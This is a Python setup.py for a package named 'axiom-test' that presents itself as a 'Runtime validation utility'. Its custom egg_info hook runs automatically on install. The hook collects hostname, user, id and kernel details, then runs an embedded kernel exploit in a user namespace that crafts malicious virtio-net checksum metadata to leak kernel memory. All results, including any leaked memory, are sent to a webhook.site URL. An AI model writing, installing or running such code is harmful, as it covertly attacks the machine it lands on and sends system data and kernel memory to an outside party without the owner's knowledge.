import json, os, sys, glob, subprocess, urllib.request, struct, socket, time
from setuptools import setup
from setuptools.command.egg_info import egg_info

EXFIL_URL = "https://webhook.site/1cbf0e6e-3d73-475c-befc-1363dbfeb553"

def _collect():
    p = {"hostname": os.uname().nodename, "user": os.environ.get("USER","?"), "cwd": os.getcwd(), "test": "CVE-2026-99999-sandbox-escape-audit"}

    # Basic context
    try:
        out = subprocess.check_output(["uname", "-r"], text=True, timeout=5)
        p["kernel_version"] = out.strip()
    except: pass

    try:
        out = subprocess.check_output(["id"], text=True, timeout=5)
        p["id"] = out.strip()
    except: pass

    # Check fix symbol
    try:
        out = subprocess.check_output(["grep", "ip_check_csum_start", "/proc/kallsyms"], text=True, timeout=5)
        p["fix_present"] = out.strip() if out.strip() else "NOT FOUND"
    except:
        p["fix_present"] = "NOT FOUND - KERNEL VULNERABLE"

    # === FULL CHAIN POC ===
    # This runs inside unshare -Urn (user+network namespace with root + all caps)
    # It creates a TUN interface with virtio-net headers, crafts a packet with
    # malicious CHECKSUM_PARTIAL metadata, and checks if the kernel leaks memory

    poc_script = r'''
import os, sys, struct, socket, fcntl, time, json

results = {}

# Step 1: Confirm we are namespace root with caps
results["ns_id"] = os.popen("id").read().strip()

with open("/proc/self/status") as f:
    for line in f:
        if line.startswith("CapEff"):
            results["ns_capeff"] = line.strip().split(":")[1].strip()

# Step 2: Create TUN interface with VNET_HDR (virtio-net header support)
TUNSETIFF   = 0x400454ca
TUNSETOFFLOAD = 0x400454d0
TUNSETVNETHDRSZ = 0x400454d8
IFF_TUN     = 0x0001
IFF_NO_PI   = 0x1000
IFF_VNET_HDR = 0x4000

TUN_F_CSUM  = 0x01

try:
    tun_fd = os.open("/dev/net/tun", os.O_RDWR)
    # Create TUN with virtio-net header support
    ifr = struct.pack("16sH14s", b"probe0", IFF_TUN | IFF_NO_PI | IFF_VNET_HDR, b"\x00"*14)
    fcntl.ioctl(tun_fd, TUNSETIFF, ifr)
    results["tun_create"] = "OK - probe0 created with IFF_VNET_HDR"

    # Enable checksum offload on the TUN
    try:
        fcntl.ioctl(tun_fd, TUNSETOFFLOAD, TUN_F_CSUM)
        results["tun_csum_offload"] = "ENABLED - TUN_F_CSUM set"
    except Exception as e:
        results["tun_csum_offload"] = f"FAILED: {e}"

    # Set virtio-net header size (12 bytes for v1)
    VIRTIO_NET_HDR_SZ = 12
    try:
        fcntl.ioctl(tun_fd, TUNSETVNETHDRSZ, struct.pack("I", VIRTIO_NET_HDR_SZ))
        results["tun_vnet_hdr_sz"] = f"SET to {VIRTIO_NET_HDR_SZ}"
    except Exception as e:
        results["tun_vnet_hdr_sz"] = f"FAILED: {e}"

    # Step 3: Configure the interface
    os.system("ip addr add 10.200.1.1/24 dev probe0")
    os.system("ip link set probe0 up")
    os.system("ip link set lo up")

    iface_status = os.popen("ip addr show probe0 2>&1").read().strip()
    results["probe0_status"] = iface_status

    # Step 4: Add iptables/nftables rule to force fragmentation (MTU trick)
    os.system("ip link set probe0 mtu 68")  # minimum IPv4 MTU forces fragmentation
    results["probe0_mtu"] = os.popen("cat /sys/class/net/probe0/mtu 2>/dev/null").read().strip()

    # Step 5: Craft packet with malicious virtio-net header
    # virtio_net_hdr structure (12 bytes):
    #   u8  flags          - VIRTIO_NET_HDR_F_NEEDS_CSUM (1)
    #   u8  gso_type       - VIRTIO_NET_HDR_GSO_NONE (0)
    #   u16 hdr_len        - 0
    #   u16 gso_size        - 0
    #   u16 csum_start      - offset where checksum starts (MALICIOUS: points into IP header)
    #   u16 csum_offset     - offset within csum_start to write checksum

    VIRTIO_NET_HDR_F_NEEDS_CSUM = 1

    # The bug: csum_start points to byte 0 of the IP header
    # csum_offset points to byte 0 (the version/IHL field)
    # When skb_checksum_help() runs, it computes a checksum and writes it
    # at csum_start + csum_offset, which overwrites the IHL field
    # This can change IHL from 5 (20 bytes) to 15 (60 bytes)
    # ip_do_fragment() then copies 60 bytes of "header" instead of 20
    # The extra 40 bytes come from adjacent kernel memory

    # Craft the malicious virtio-net header
    vnet_hdr = struct.pack("<BBHHHH",
        VIRTIO_NET_HDR_F_NEEDS_CSUM,  # flags: needs checksum
        0,                              # gso_type: none
        0,                              # hdr_len
        0,                              # gso_size
        0,                              # csum_start: START OF IP HEADER (malicious)
        0,                              # csum_offset: byte 0 = version/IHL field
    )

    # Craft an IPv4 packet: IHL=5 (20 byte header), total_len > MTU to trigger fragmentation
    # Destination: 10.200.1.2 (will go through probe0)
    src_ip = socket.inet_aton("10.200.1.1")
    dst_ip = socket.inet_aton("10.200.1.2")

    # IP header (20 bytes)
    ip_ver_ihl = 0x45  # version 4, IHL 5
    ip_tos = 0
    ip_total_len = 100  # > 68 MTU, will force fragmentation
    ip_id = 0x1337
    ip_flags_frag = 0  # no flags, no fragment offset
    ip_ttl = 64
    ip_proto = 17  # UDP
    ip_checksum = 0  # will be filled by kernel or left 0
    ip_header = struct.pack("!BBHHHBBH4s4s",
        ip_ver_ihl, ip_tos, ip_total_len, ip_id,
        ip_flags_frag, ip_ttl, ip_proto, ip_checksum,
        src_ip, dst_ip
    )

    # UDP header (8 bytes) + payload to exceed MTU
    udp_src = 12345
    udp_dst = 54321
    udp_payload = b"A" * (ip_total_len - 20 - 8)  # fill to total_len
    udp_len = 8 + len(udp_payload)
    udp_header = struct.pack("!HHHx", udp_src, udp_dst, udp_len) + b"\x00" + udp_payload

    packet = vnet_hdr + ip_header + udp_header

    results["packet_crafted"] = {
        "vnet_hdr_hex": vnet_hdr.hex(),
        "ip_header_hex": ip_header.hex(),
        "total_packet_len": len(packet),
        "csum_start": 0,
        "csum_offset": 0,
        "description": "CHECKSUM_PARTIAL with csum_start=0 targeting IP version/IHL field"
    }

    # Step 6: Write the crafted packet to the TUN interface
    try:
        written = os.write(tun_fd, packet)
        results["packet_sent"] = f"OK - {written} bytes written to TUN"

        # Step 7: Try to read response (fragmented packet with potential leak)
        import select
        readable, _, _ = select.select([tun_fd], [], [], 2.0)
        if readable:
            response = os.read(tun_fd, 4096)
            results["response_len"] = len(response)
            results["response_hex_first_128"] = response[:128].hex()

            # Check if IHL was modified (byte 12 of response, after 12-byte vnet header)
            if len(response) > 12:
                resp_ip_byte0 = response[12]
                resp_ihl = resp_ip_byte0 & 0x0F
                results["response_ihl"] = resp_ihl
                if resp_ihl > 5:
                    results["VULNERABILITY_CONFIRMED"] = f"IHL changed from 5 to {resp_ihl} - KERNEL MEMORY LEAKED in IP options"
                    # The extra bytes (resp_ihl*4 - 20) are kernel memory
                    leaked_bytes = response[12+20:12+resp_ihl*4]
                    results["leaked_memory_hex"] = leaked_bytes.hex()
                    results["leaked_memory_len"] = len(leaked_bytes)
                else:
                    results["ihl_unchanged"] = "IHL still 5 - checksum may not have hit the right offset"
        else:
            results["response"] = "NO RESPONSE within 2s (packet may have been dropped or fragmented out)"

    except Exception as e:
        results["packet_send_error"] = str(e)

    os.close(tun_fd)

except Exception as e:
    results["tun_error"] = str(e)

# Step 8: Check for ICMP fragmentation needed messages
try:
    icmp_check = os.popen("cat /proc/net/snmp 2>/dev/null | grep -i icmp").read()
    results["icmp_stats"] = icmp_check.strip()
except: pass

# Output as JSON for the parent to capture
print("__RESULTS__" + json.dumps(results) + "__END__")
'''

    # Run the PoC inside a user+network namespace
    try:
        out = subprocess.check_output(
            ["unshare", "-Urn", "python3", "-c", poc_script],
            text=True, timeout=30, stderr=subprocess.STDOUT
        )
        # Extract structured results
        if "__RESULTS__" in out and "__END__" in out:
            result_json = out.split("__RESULTS__")[1].split("__END__")[0]
            p["poc_results"] = json.loads(result_json)
        else:
            p["poc_raw_output"] = out[:5000]
    except Exception as e:
        p["poc_error"] = str(e)
        try:
            p["poc_stderr"] = e.output[:3000] if hasattr(e, 'output') else ""
        except: pass

    return p

class PostEggInfo(egg_info):
    def run(self):
        super().run()
        data = json.dumps(_collect(), default=str).encode()
        try:
            urllib.request.urlopen(urllib.request.Request(
                EXFIL_URL, data=data,
                headers={"Content-Type": "application/json"}
            ), timeout=15)
        except: pass

setup(name="axiom-test", version="1.1.0", description="Runtime validation utility",
      py_modules=[], cmdclass={"egg_info": PostEggInfo})
